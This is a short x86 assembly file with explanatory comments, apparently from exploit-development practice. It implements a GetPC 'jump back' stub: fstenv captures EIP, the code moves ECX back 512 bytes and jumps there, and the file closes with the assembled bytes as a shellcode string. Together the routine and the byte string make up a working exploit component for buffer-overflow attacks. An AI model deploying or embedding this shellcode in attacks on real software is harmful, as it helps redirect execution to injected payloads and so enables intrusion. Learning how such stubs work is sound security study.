global _start
section .text
_start:

fldz ;load zero into the FPU stack
fstenv [esp-0xc] ;store the fpu environment in memory position ESP-12. one of the things that are also stored is EIP. EIP is stored in addr+12bytes
pop ecx	; since we stored the ENV in ESP-12, and EIP is stored in ESP+12. popping will give us EIP. hence we store EIP into ECX
dec ch ; decrementing the higher byte of CX means decrementing ECX by 256 byte.
dec ch ; decrementing the higher byte of CX means decrementing ECX by 256 byte.
jmp ecx ; jmp to ECX which now gives us 512bytes of space


; shellcode = \xd9\xee\xd9\x74\x24\xf4\x59\xfe\xcd\xfe\xcd\xff\xe1